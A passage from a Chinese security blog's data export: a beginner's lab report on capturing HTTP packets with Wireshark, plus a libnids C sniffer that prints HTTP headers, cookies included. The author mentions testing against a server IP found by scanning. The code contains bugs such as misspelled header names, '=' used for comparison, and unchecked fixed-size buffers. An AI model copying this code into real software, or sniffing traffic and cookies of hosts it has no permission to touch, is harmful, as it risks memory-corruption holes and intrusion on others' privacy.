&quot;CaChe-Control&quot;)) &#123; printf(&quot;缓存机制为 （ CaChe-Control ）: %s\\n&quot;, temp + strlen(&quot;CaChe-Control:&quot;)); printf(&quot;%s\\n&quot;, temp); &#125; if (strstr(temp, &quot;Expires&quot;)) &#123; printf(&quot;资源期限为 （ Expires ）: %s\\n&quot;, temp + strlen(&quot;Erpires:&quot;)); printf(&quot;%s\\n&quot;, temp); &#125; if (strstr(temp, &quot;Last-Modified&quot;)) &#123; printf(&quot;最后一次修改时间为 （ Last-Modified ）: %s\\n&quot;, temp + strlen(&quot;Last-Modified:&quot;)); printf(&quot;%s\\n&quot;, temp); &#125; if (strstr(temp, &quot;ETag&quot;)) &#123; printf(&quot;ETag为 （ ETag ）: %s\\n&quot;, temp + strlen(&quot;ETag:&quot;)); printf(&quot;%s\\n&quot;, temp); &#125; if (strstr(temp, &quot;Accept-Ranges&quot;)) &#123; printf(&quot;Accept-Ranges （ Accept-Ranges ）: %s\\n&quot;, temp + strlen(&quot;Accept-Ranges:&quot;)); printf(&quot;%s\\n&quot;, temp); &#125; if (strstr(temp, &quot;Content-Length&quot;)) &#123; printf(&quot;内容长度为 （ Content-Length ）: %s\\n&quot;, temp + strlen(&quot;Content-Length:&quot;)); printf(&quot;%s\\n&quot;, temp); &#125; if (strstr(temp, &quot;Connection&quot;)) &#123; printf(&quot;连接状态为 （ Connection ）: %s\\n&quot;, temp + strlen(&quot;Connection:&quot;)); printf(&quot;%s\\n&quot;, temp); &#125; if (strstr(temp, &quot;Connent-Type&quot;)) &#123; printf(&quot;内容类型为 （ Content-Type ）: %s\\n&quot;, temp + strlen(&quot;Content-Type:&quot;)); printf(&quot;%s\\n&quot;, temp); &#125; /*获取实体内容*/ if ((content[i] == &#x27;\\n&#x27;) &amp;&amp; (content[i + 1] == &#x27;\\r&#x27;)) &#123; if (i + 3 == strlen(content)) &#123; printf(&quot;无实体内容\\n&quot;); break; &#125; for (j = 0; j &lt; number - i - 3; j++) entity_content[j] = content[i + 3 + j]; entity_content[j] = &#x27;\\0&#x27;; printf(&quot;实体内容为: \\n&quot;); for (i = 0; i &lt; j; i++) &#123; printf(&quot;%s&quot;, char_to_ascii(entity_content[i])); &#125; printf(&quot;\\n&quot;); break; &#125; k = 0; &#125; &#125;&#125;void parse_server_data(char content[], int number)&#123; char temp[1024]; char str1[1024]; char str2[1024]; char str3[1024]; unsigned int i; unsigned int k=0; unsigned int j; char entity_content[1024]; for (i = 0; i &lt; strlen(content); i++) &#123; if (content[i] != &#x27;\\n&#x27;) &#123; k++; continue; &#125; for(j = 0; j &lt; k; j++) temp[j] = content[j + i - k]; temp[j]=&#x27;\\0&#x27;; if (strstr(temp, &quot;GET&quot;)) &#123; printf(&quot;请求行为:&quot;); printf(&quot;%s\\n&quot;, temp); sscanf(temp, &quot;%s %s %s&quot;, str1, str2, str3); printf(&quot;使用的命令为: %s\\n&quot;, str1); printf(&quot;获得的资源为: %s\\n&quot;, str2); printf(&quot;HTTP协议类型为: %s\\n&quot;, str3); &#125; if (strstr(temp, &quot;Accept:&quot;)) &#123; printf(&quot;接受的文件包括 ( Accpet: ) :%s\\n&quot;, temp + strlen(&quot;Accept:&quot;)); printf(&quot;%s\\n&quot;, temp); &#125; if (strstr(temp, &quot;Referer&quot;)) &#123; printf(&quot;转移地址为 ( Referer ) :%s\\n&quot;, temp + strlen(&quot;Referer:&quot;)); printf(&quot;%s\\n&quot;, temp); &#125; if (strstr(temp, &quot;Accept-Language&quot;)) &#123; printf(&quot;使用的语言为 ( Accept-Language ) :%s\\n&quot;, temp + strlen(&quot;Accept-Language:&quot;)); printf(&quot;%s\\n&quot;, temp); &#125; if (strstr(temp, &quot;Accept-Encoding&quot;)) &#123; printf(&quot;接收的编码方式为 ( Accept-Encoding ) :%s\\n&quot;, temp + strlen(&quot;Accept-Encoding:&quot;)); printf(&quot;%s\\n&quot;, temp); &#125; if (strstr(temp, &quot;If-Modified-Since&quot;)) &#123; printf(&quot;上次修改的时间为 ( If-Modified-Since ) :%s\\n&quot;, temp + strlen(&quot;If-Modified-Since:&quot;)); printf(&quot;%s\\n&quot;, temp); &#125; if (strstr(temp, &quot;If-None-Match&quot;)) &#123; printf(&quot;If-None-Match 为 ( If-None-Match ) :%s\\n&quot;, temp + strlen(&quot;Id-None-Match:&quot;)); printf(&quot;%s\\n&quot;, temp); &#125; if (strstr(temp, &quot;User-Agent&quot;)) &#123; printf(&quot;用户的浏览信息为 ( User-Agent ) :%s\\n&quot;, temp + strlen(&quot;User-Agent:&quot;)); printf(&quot;%s\\n&quot;, temp); &#125; if (strstr(temp, &quot;Host&quot;)) &#123; printf(&quot;访问的主机为 ( Host ) :%s\\n&quot;, temp + strlen(&quot;Host:&quot;)); printf(&quot;%s\\n&quot;, temp); &#125; if (strstr(temp, &quot;Connection&quot;)) &#123; printf(&quot;连接状态为 ( Connection ) :%s\\n&quot;, temp + strlen(&quot;Connection:&quot;)); printf(&quot;%s\\n&quot;, temp); &#125; if (strstr(temp, &quot;Cookie&quot;)) &#123; printf(&quot;Cookie 为 ( Cookie ) :%s\\n&quot;, temp + strlen(&quot;Cookie:&quot;)); printf(&quot;%s\\n&quot;, temp); &#125; if((content[i] == &#x27;\\n&#x27;) &amp;&amp; (content[i + 1] = &#x27;\\r&#x27;) &amp;&amp; (content[i + 2] = &#x27;\\n&#x27;)) &#123; if (i + 3 == strlen(content)) &#123; printf(&quot;无实体内容 \\n&quot;); break; &#125; for (j = 0; j &lt; strlen(content) - i - 3; j++) entity_content[j] = content[i + 3 + j]; entity_content[j] = &#x27;\\0&#x27;; printf(&quot;实体内容为: \\n&quot;); printf(&quot;%s&quot;, entity_content); printf(&quot;\\n&quot;); break; &#125; k = 0; &#125;&#125;void http_protocol_callback(struct tcp_stream *tcp_http_connection, void **param)&#123; char address_content[1024]; char content[65535]; //char content_urgent[65535]; struct tuple4 ip_and_port = tcp_http_connection-&gt;addr; strcpy(address_content, inet_ntoa(*((struct in_addr*) &amp; (ip_and_port.saddr)))); sprintf(address_content + strlen(address_content), &quot; : %i&quot;, ip_and_port.source); strcat(address_content, &quot;&lt;----&gt;&quot;); strcat(address_content, inet_ntoa(*((struct in_addr*) &amp; (ip_and_port.daddr)))); sprintf(address_content + strlen(address_content), &quot; : %i&quot;, ip_and_port.dest); strcat(address_content, &quot;\\n&quot;); if(tcp_http_connection-&gt;nids_state == NIDS_JUST_EST) &#123; if (tcp_http_connection-&gt;addr.dest !=80) &#123; return ; &#125; tcp_http_connection-&gt;client.collect++; tcp_http_connection-&gt;server.collect++; printf(&quot;\\n\\n\\n=========================================\\n&quot;); printf(&quot;%s 建立连接...\\n&quot;,address_content); return ; &#125; if(tcp_http_connection-&gt;nids_state == NIDS_CLOSE) &#123; printf(&quot;-----------------------------\\n&quot;); printf(&quot;%s正常关闭...\\n&quot;,address_content); return ; &#125; if (tcp_http_connection-&gt;nids_state == NIDS_RESET) &#123; printf(&quot;-----------------------------\\n&quot;); printf(&quot;%s连接被RST关闭..\\n&quot;, address_content); return ; &#125; if (tcp_http_connection-&gt;nids_state == NIDS_DATA) &#123; struct half_stream *hlf; if (tcp_http_connection-&gt;client.count_new) &#123; hlf = &amp;tcp_http_connection-&gt;client; strcpy(address_content, inet_ntoa(*((struct in_addr*)&amp;(ip_and_port.saddr)))); sprintf(address_content + strlen(address_content), &quot;:%i&quot;, ip_and_port.source); strcat(address_content, &quot;&lt;----&quot;); strcat(address_content, inet_ntoa(*((struct in_addr*)&amp;(ip_and_port.daddr)))); sprintf(address_content + strlen(address_content), &quot;:%i&quot;, ip_and_port.dest); strcat(address_content, &quot;\\n&quot;); printf(&quot;\\n&quot;); printf(&quot;%s&quot;, address_content); printf(&quot;浏览器接收的数据...\\n&quot;); printf(&quot;\\n&quot;); memcpy(content, hlf-&gt;data, hlf-&gt;count_new); content[hlf-&gt;count_new] = &#x27;\\0&#x27;; parse_client_data(content, hlf-&gt;count_new); &#125; else &#123; hlf = &amp;tcp_http_connection-&gt;server; strcpy(address_content, inet_ntoa(*((struct in_addr*) &amp; (ip_and_port.saddr)))); sprintf(address_content + strlen(address_content), &quot;:%i&quot;, ip_and_port.source); strcat(address_content, &quot;----&gt;&quot;); strcat(address_content, inet_ntoa(*((struct in_addr*) &amp; (ip_and_port.daddr)))); sprintf(address_content + strlen(address_content), &quot;:%i&quot;, ip_and_port.dest); strcat(address_content, &quot;\\n&quot;); printf(&quot;\\n&quot;); printf(&quot;%s&quot;, address_content); printf(&quot;服务器接收数据...\\n&quot;); printf(&quot;\\n&quot;); memcpy(content, hlf-&gt;data, hlf-&gt;count_new); content[hlf-&gt;count_new] = &#x27;\\0&#x27;; parse_server_data(content, hlf-&gt;count_new); &#125; &#125; return ;&#125;int main(void)&#123; struct nids_chksum_ctl tmp; //关闭校验和 tmp.netaddr = 0; tmp.mask = 0; tmp.action = 1; nids_register_chksum_ctl(&amp;tmp, 1); printf(&quot;nids_chksum_ctl:%d\\n&quot;,tmp.action); if (!nids_init()) &#123; printf(&quot;出现错误: %s\\n&quot;, nids_errbuf); exit(1); &#125; nids_register_tcp(http_protocol_callback); nids_run(); return 0;&#125; 效果展示","tags":[{"name":"协议分析","slug":"协议分析","permalink":"http://ciaofox.me/tags/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"}],"categories":[{"name":"协议分析","slug":"协议分析","permalink":"http://ciaofox.me/categories/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"}]},{"title":"协议分析之wireshark初次抓包","date":"2018-10-16T01:57:37.000Z","path":"2018/10/16/协议分析/协议分析之wireshark初次抓包/","text":"本报告写于我刚刚进入网络安全专业第三周，以现在的目光来看这篇报告质量十分之低，缺点包括且不限于：实验太过简单，代码过多等。但是我依然记得当我在Ubuntu中配置好QT码了半小时代码之后按下运行时，看到一个个数据包以命令行的方式出现在屏幕上，那瞬间我的感受。就像是看到了一个新的世界。正是因为这种感受，我才确定了对于网络安全的热爱，并决定了在安全方向继续发展。 一、实验目的：1．学会初级的搭建服务器操作，并对其流量有一定了解。 2．对burpsuite和wireshark的区别有一定了解。 3．学会编写抓取HTTP包的C程序。 二、实验内容：1.自己搭建web服务器，访问并抓取流量 2.画图解释BurpSuite和wireshark区别 3.QT.里面编写抓取http包程序 三、实验步骤：抓取服务器流量 因为手里刚好有最近扫出来的一个IP，可以用来配合做实验，就不再使用虚拟机搭建服务器，直接用现成IP实验抓包。 打开wireshark，抓取该IP的数据包。获得很多。可以看出，三次握手之后本机IP向目标IP发送了get请求，然后目的IP发送了数据包（包含网页信息）给本机IP。浏览器再将其打开。 可以看到抓取到的包和网页元素相对应。 Burpsuite和wireshark的区别 四、编写HTTP抓取程序代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696\\#include \\&lt;sys/socket.h\\&gt;\\#include \\&lt;netinet/in.h\\&gt;\\#include \\&lt;arpa/inet.h\\&gt;\\#include &quot;nids.h&quot;char ascii_string[10000];char \\*char_to_ascii(char ch)/\\*此函数功能主要用于把协议数据进行显示\\*/&#123;char \\*string;ascii_string[0] = 0;string = ascii_string;/\\*打印字符\\*/if(isgraph(ch))&#123;\\*string++ = ch;&#125;/\\*打印空格\\*/else if (ch == &#x27;.&#x27;)&#123;\\*string++ == ch;&#125;/\\*打印回车和换行\\*/else if (ch == &#x27;\\\\n&#x27; \\|\\| ch == &#x27;\\\\r&#x27;)&#123;\\*string++ = ch;&#125;/\\*打印其他字符，以.显示\\*/else&#123;\\*string++ = &#x27;.&#x27;;&#125;\\*string = 0;return ascii_string;&#125;void parse_client_data(char content[], int number)&#123;char temp[1024];char str1[1024];//http协议char str2[1024];//状态码显示char str3[1024];//未知代码unsigned int i;unsigned int k=0;unsigned int j;char entity_content[1024];if(content[0] != &#x27;H&#x27; &amp;&amp; content[1] != &#x27;T&#x27; &amp;&amp; content[2] != &#x27;T&#x27; &amp;&amp; content[3] !=&#x27;P&#x27;)&#123;printf(&quot;实体内容为（续）: \\\\n&quot;);for (i = 0; i \\&lt; number; i++)&#123;printf(&quot;%s&quot;, char_to_ascii(content[i]));&#125;printf(&quot;\\\\n&quot;);&#125;else&#123;printf(&quot;number:%d\\\\n&quot;,number);for (i = 0; i \\&lt; strlen(content); i++)&#123;if (content[i] != &#x27;\\\\n&#x27;)&#123;k++;continue;&#125;for (j = 0; j \\&lt; k; j++)&#123;temp[j] = content[j + i - k];&#125;temp[j] = &#x27;\\\\0&#x27;;if (strstr(temp, &quot;HTTP&quot;))&#123;printf(&quot;状态行为: &quot;);printf(&quot;%s\\\\n&quot;,temp);sscanf(temp, &quot;%s %s %s&quot;, str1, str2,str3);printf(&quot;HTTP协议为: %s\\\\n&quot;, str1);printf(&quot;状态代码为: %s\\\\n&quot;, str2);printf(&quot;未知代码：%s\\\\n&quot;,str3);&#125;if (strstr(temp, &quot;Date&quot;))&#123;printf(&quot;当前的时间为(Date) : %s\\\\n&quot;, temp + strlen(&quot;Date:&quot;));printf(&quot;%s\\\\n&quot;, temp);&#125;if (strstr(temp, &quot;Server&quot;))&#123;printf(&quot;服务器为 （ Server ）: %s\\\\n&quot;, temp + strlen(&quot;Server:&quot;));printf(&quot;%s\\\\n&quot;, temp);&#125;if (strstr(temp, &quot;CaChe-Control&quot;))&#123;printf(&quot;缓存机制为 （ CaChe-Control ）: %s\\\\n&quot;, temp +strlen(&quot;CaChe-Control:&quot;));printf(&quot;%s\\\\n&quot;, temp);&#125;if (strstr(temp, &quot;Expires&quot;))&#123;printf(&quot;资源期限为 （ Expires ）: %s\\\\n&quot;, temp + strlen(&quot;Erpires:&quot;));printf(&quot;%s\\\\n&quot;, temp);&#125;if (strstr(temp, &quot;Last-Modified&quot;))&#123;printf(&quot;最后一次修改时间为 （ Last-Modified ）: %s\\\\n&quot;, temp +strlen(&quot;Last-Modified:&quot;));printf(&quot;%s\\\\n&quot;, temp);&#125;if (strstr(temp, &quot;ETag&quot;))&#123;printf(&quot;ETag为 （ ETag ）: %s\\\\n&quot;, temp + strlen(&quot;ETag:&quot;));printf(&quot;%s\\\\n&quot;, temp);&#125;if (strstr(temp, &quot;Accept-Ranges&quot;))&#123;printf(&quot;Accept-Ranges （ Accept-Ranges ）: %s\\\\n&quot;, temp +strlen(&quot;Accept-Ranges:&quot;));printf(&quot;%s\\\\n&quot;, temp);&#125;if (strstr(temp, &quot;Content-Length&quot;))&#123;printf(&quot;内容长度为 （ Content-Length ）: %s\\\\n&quot;, temp +strlen(&quot;Content-Length:&quot;));printf(&quot;%s\\\\n&quot;, temp);&#125;if (strstr(temp, &quot;Connection&quot;))&#123;printf(&quot;连接状态为 （ Connection ）: %s\\\\n&quot;, temp + strlen(&quot;Connection:&quot;));printf(&quot;%s\\\\n&quot;, temp);&#125;if (strstr(temp, &quot;Connent-Type&quot;))&#123;printf(&quot;内容类型为 （ Content-Type ）: %s\\\\n&quot;, temp + strlen(&quot;Content-Type:&quot;));printf(&quot;%s\\\\n&quot;, temp);&#125;/\\*获取实体内容\\*/if ((content[i] == &#x27;\\\\n&#x27;) &amp;&amp; (content[i + 1] == &#x27;\\\\r&#x27;))&#123;if (i + 3 == strlen(content))&#123;printf(&quot;无实体内容\\\\n&quot;);break;&#125;for (j = 0; j \\&lt; number - i - 3; j++)entity_content[j] = content[i + 3 + j];entity_content[j] = &#x27;\\\\0&#x27;;printf(&quot;实体内容为: \\\\n&quot;);for (i = 0; i \\&lt; j; i++)&#123;printf(&quot;%s&quot;, char_to_ascii(entity_content[i]));&#125;printf(&quot;\\\\n&quot;);break;&#125;k = 0;&#125;&#125;&#125;void parse_server_data(char content[], int number)&#123;char temp[1024];char str1[1024];char str2[1024];char str3[1024];unsigned int i;unsigned int k=0;unsigned int j;char entity_content[1024];for (i = 0; i \\&lt; strlen(content); i++)&#123;if (content[i] != &#x27;\\\\n&#x27;)&#123;k++;continue;&#125;for(j = 0; j \\&lt; k; j++)temp[j] = content[j + i - k];temp[j]=&#x27;\\\\0&#x27;;if (strstr(temp, &quot;GET&quot;))&#123;printf(&quot;请求行为:&quot;);printf(&quot;%s\\\\n&quot;, temp);sscanf(temp, &quot;%s %s %s&quot;, str1, str2, str3);printf(&quot;使用的命令为: %s\\\\n&quot;, str1);printf(&quot;获得的资源为: %s\\\\n&quot;, str2);printf(&quot;HTTP协议类型为: %s\\\\n&quot;, str3);&#125;if (strstr(temp, &quot;Accept:&quot;))&#123;printf(&quot;接受的文件包括 ( Accpet: ) :%s\\\\n&quot;, temp + strlen(&quot;Accept:&quot;));printf(&quot;%s\\\\n&quot;, temp);&#125;if (strstr(temp, &quot;Referer&quot;))&#123;printf(&quot;转移地址为 ( Referer ) :%s\\\\n&quot;, temp + strlen(&quot;Referer:&quot;));printf(&quot;%s\\\\n&quot;, temp);&#125;if (strstr(temp, &quot;Accept-Language&quot;))&#123;printf(&quot;使用的语言为 ( Accept-Language ) :%s\\\\n&quot;, temp +strlen(&quot;Accept-Language:&quot;));printf(&quot;%s\\\\n&quot;, temp);&#125;if (strstr(temp, &quot;Accept-Encoding&quot;))&#123;printf(&quot;接收的编码方式为 ( Accept-Encoding ) :%s\\\\n&quot;, temp +strlen(&quot;Accept-Encoding:&quot;));printf(&quot;%s\\\\n&quot;, temp);&#125;if (strstr(temp, &quot;If-Modified-Since&quot;))&#123;printf(&quot;上次修改的时间为 ( If-Modified-Since ) :%s\\\\n&quot;, temp +strlen(&quot;If-Modified-Since:&quot;));printf(&quot;%s\\\\n&quot;, temp);&#125;if (strstr(temp, &quot;If-None-Match&quot;))&#123;printf(&quot;If-None-Match 为 ( If-None-Match ) :%s\\\\n&quot;, temp +strlen(&quot;Id-None-Match:&quot;));printf(&quot;%s\\\\n&quot;, temp);&#125;if (strstr(temp, &quot;User-Agent&quot;))&#123;printf(&quot;用户的浏览信息为 ( User-Agent ) :%s\\\\n&quot;, temp + strlen(&quot;User-Agent:&quot;));printf(&quot;%s\\\\n&quot;, temp);&#125;if (strstr(temp, &quot;Host&quot;))&#123;printf(&quot;访问的主机为 ( Host ) :%s\\\\n&quot;, temp + strlen(&quot;Host:&quot;));printf(&quot;%s\\\\n&quot;, temp);&#125;if (strstr(temp, &quot;Connection&quot;))&#123;printf(&quot;连接状态为 ( Connection ) :%s\\\\n&quot;, temp + strlen(&quot;Connection:&quot;));printf(&quot;%s\\\\n&quot;, temp);&#125;if (strstr(temp, &quot;Cookie&quot;))&#123;printf(&quot;Cookie 为 ( Cookie ) :%s\\\\n&quot;, temp + strlen(&quot;Cookie:&quot;));printf(&quot;%s\\\\n&quot;, temp);&#125;if((content[i] == &#x27;\\\\n&#x27;) &amp;&amp; (content[i + 1] = &#x27;\\\\r&#x27;) &amp;&amp; (content[i + 2] =&#x27;\\\\n&#x27;))&#123;if (i + 3 == strlen(content))&#123;printf(&quot;无实体内容 \\\\n&quot;);break;&#125;for (j = 0; j \\&lt; strlen(content) - i - 3; j++)entity_content[j] = content[i + 3 + j];entity_content[j] = &#x27;\\\\0&#x27;;printf(&quot;实体内容为: \\\\n&quot;);printf(&quot;%s&quot;, entity_content);printf(&quot;\\\\n&quot;);break;&#125;k = 0;&#125;&#125;void http_protocol_callback(struct tcp_stream \\*tcp_http_connection, void\\*\\*param)&#123;char address_content[1024];char content[65535];//char content_urgent[65535];struct tuple4 ip_and_port = tcp_http_connection-\\&gt;addr;strcpy(address_content, inet_ntoa(\\*((struct in_addr\\*) &amp;(ip_and_port.saddr))));sprintf(address_content + strlen(address_content), &quot; : %i&quot;, ip_and_port.source);strcat(address_content, &quot;\\&lt;----\\&gt;&quot;);strcat(address_content, inet_ntoa(\\*((struct in_addr\\*) &amp;(ip_and_port.daddr))));sprintf(address_content + strlen(address_content), &quot; : %i&quot;, ip_and_port.dest);strcat(address_content, &quot;\\\\n&quot;);if(tcp_http_connection-\\&gt;nids_state == NIDS_JUST_EST)&#123;if (tcp_http_connection-\\&gt;addr.dest !=80)&#123;return ;&#125;tcp_http_connection-\\&gt;client.collect++;tcp_http_connection-\\&gt;server.collect++;printf(&quot;\\\\n\\\\n\\\\n=========================================\\\\n&quot;);printf(&quot;%s 建立连接...\\\\n&quot;,address_content);return ;&#125;if(tcp_http_connection-\\&gt;nids_state == NIDS_CLOSE)&#123;printf(&quot;-----------------------------\\\\n&quot;);printf(&quot;%s正常关闭...\\\\n&quot;,address_content);return ;&#125;if (tcp_http_connection-\\&gt;nids_state == NIDS_RESET)&#123;printf(&quot;-----------------------------\\\\n&quot;);printf(&quot;%s连接被RST关闭..\\\\n&quot;, address_content);return ;&#125;if (tcp_http_connection-\\&gt;nids_state == NIDS_DATA)&#123;struct half_stream \\*hlf;if (tcp_http_connection-\\&gt;client.count_new)&#123;hlf = \\&amp;tcp_http_connection-\\&gt;client;strcpy(address_content, inet_ntoa(\\*((struct in_addr\\*)\\&amp;(ip_and_port.saddr))));sprintf(address_content + strlen(address_content), &quot;:%i&quot;, ip_and_port.source);strcat(address_content, &quot;\\&lt;----&quot;);strcat(address_content, inet_ntoa(\\*((struct in_addr\\*)\\&amp;(ip_and_port.daddr))));sprintf(address_content + strlen(address_content), &quot;:%i&quot;, ip_and_port.dest);strcat(address_content, &quot;\\\\n&quot;);printf(&quot;\\\\n&quot;);printf(&quot;%s&quot;, address_content);printf(&quot;浏览器接收的数据...\\\\n&quot;);printf(&quot;\\\\n&quot;);memcpy(content, hlf-\\&gt;data, hlf-\\&gt;count_new);content[hlf-\\&gt;count_new] = &#x27;\\\\0&#x27;;parse_client_data(content, hlf-\\&gt;count_new);&#125;else&#123;hlf = \\&amp;tcp_http_connection-\\&gt;server;strcpy(address_content, inet_ntoa(\\*((struct in_addr\\*) &amp;(ip_and_port.saddr))));sprintf(address_content + strlen(address_content), &quot;:%i&quot;, ip_and_port.source);strcat(address_content, &quot;----\\&gt;&quot;);strcat(address_content, inet_ntoa(\\*((struct in_addr\\*) &amp;(ip_and_port.daddr))));sprintf(address_content + strlen(address_content), &quot;:%i&quot;, ip_and_port.dest);strcat(address_content, &quot;\\\\n&quot;);printf(&quot;\\\\n&quot;);printf(&quot;%s&quot;, address_content);printf(&quot;服务器接收数据...\\\\n&quot;);printf(&quot;\\\\n&quot;);memcpy(content, hlf-\\&gt;data, hlf-\\&gt;count_new);content[hlf-\\&gt;count_new] = &#x27;\\\\0&#x27;;parse_server_data(content, hlf-\\&gt;count_new);&#125;&#125;return ;&#125;int main(void)&#123;struct nids_chksum_ctl tmp;//关闭校验和tmp.netaddr = 0;tmp.mask = 0;tmp.action = 1;nids_register_chksum_ctl(&amp;tmp, 1);printf(&quot;nids_chksum_ctl:%d\\\\n&quot;,tmp.action);if (!nids_init())&#123;printf(&quot;出现错误: %s\\\\n&quot;, nids_errbuf);exit(1);&#125;nids_register_tcp(http_protocol_callback);nids_run();return 0;&#125; 从数据流可以看到，代码可以详细地显示请求行为，使用命令，资源，实体内容和HTTP协议类型。","tags":[{"name":"协议分析","slug":"协议分析","permalink":"http://ciaofox.me/tags/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"}],"categories":[{"name":"协议分析","slug":"协议分析","permalink":"http://ciaofox.me/categories/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"}]}],"categories":[{"name":"安全运营","slug":"安全运营","permalink":"http://ciaofox.me/categories/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"},{"name":"OSCP之路","slug":"OSCP之路","permalink":"http://ciaofox.me/categories/OSCP%E4%B9%8B%E8%B7%AF/"},{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/categories/LeetCode/"},{"name":"600 Privilege Escalation 权限提升","slug":"600-Privilege-Escalation-权限提升","permalink":"http://ciaofox.me/categories/600-Privilege-Escalation-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"},{"name":"400 Execution 攻击","slug":"400-Execution-攻击","permalink":"http://ciaofox.me/categories/400-Execution-%E6%94%BB%E5%87%BB/"},{"name":"闲谈","slug":"闲谈","permalink":"http://ciaofox.me/categories/%E9%97%B2%E8%B0%88/"},{"name":"协议分析","slug":"协议分析","permalink":"http://ciaofox.me/categories/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"}],"tags":[{"name":"安全运营","slug":"安全运营","permalink":"http://ciaofox.me/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"},{"name":"未完成","slug":"未完成","permalink":"http://ciaofox.me/tags/%E6%9C%AA%E5%AE%8C%E6%88%90/"},{"name":"OSCP","slug":"OSCP","permalink":"http://ciaofox.me/tags/OSCP/"},{"name":"LeetCode","slug":"LeetCode","permalink":"http://ciaofox.me/tags/LeetCode/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://ciaofox.me/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"原理分析","slug":"原理分析","permalink":"http://ciaofox.me/tags/%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"},{"name":"提权漏洞","slug":"提权漏洞","permalink":"http://ciaofox.me/tags/%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"},{"name":"远程代码执行","slug":"远程代码执行","permalink":"http://ciaofox.me/tags/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},{"name":"文件上传","slug":"文件上传","permalink":"http://ciaofox.me/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"XSS","slug":"XSS","permalink":"http://ciaofox.me/tags/XSS/"},{"name":"协议分析","slug":"协议分析","permalink":"http://ciaofox.me/tags/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"},{"name":"路径遍历","slug":"路径遍历","permalink":"http://ciaofox.me/tags/%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/"}]}